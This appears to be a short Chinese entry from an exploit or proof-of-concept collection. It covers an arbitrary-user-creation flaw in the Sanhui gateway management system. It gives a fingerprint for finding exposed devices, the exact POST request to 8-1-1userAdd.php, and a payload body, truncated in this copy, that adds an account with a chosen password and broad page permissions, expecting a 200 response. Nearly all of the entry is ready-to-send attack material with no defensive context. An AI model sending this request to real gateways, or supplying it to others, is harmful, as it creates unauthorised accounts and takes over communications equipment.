# 三汇网关管理系统-8-1-1userAdd存在任意用户添加漏洞

- **系统**：三汇网关管理系统-8-1-1userAdd　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="text ml10 mr20"`
- **请求**：`POST /en/8-1-1userAdd.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
user_name=ABC090&user_token=&user_password=aklsd11231kkkJ!&user_authorization=1&page%5B%5D=1-1sysinfo&page%5B%5D=1-4chstatus&page%5B%5D=1-3callcount&page%5B%5D=1-6sipmsgcount&page%5B%5D=1-5guideset&page%5B%5D=2-1sipset&page%5B%5D=2-3sipcompatibility&page%5B%5D=2-4natset&page%5B%5D=2-2mediaset&page%5B%5D=3-1-1FXSset&page%5B%5D=3-8tone&page%5B%5D=3-12callsound&page%5B%5D=3-10dtmf&page%5B%5D=3-9ringnum&page%5B%5D=3-2faxpara&page%5B%5D=3-3funkey&page%5B%5D=3-4dialrules&page%5B%5D=3-5dialtimeout&page%5B%5D=3-7tip&page%5B%5D=3-11ringback&page%5B%5D=3-8qos&page%5B%5D=3-14actionurl&page%5B%5D=3-17Modu…（脚本共 1438 字，完整版见原文）
```
- **预期**：200　|　—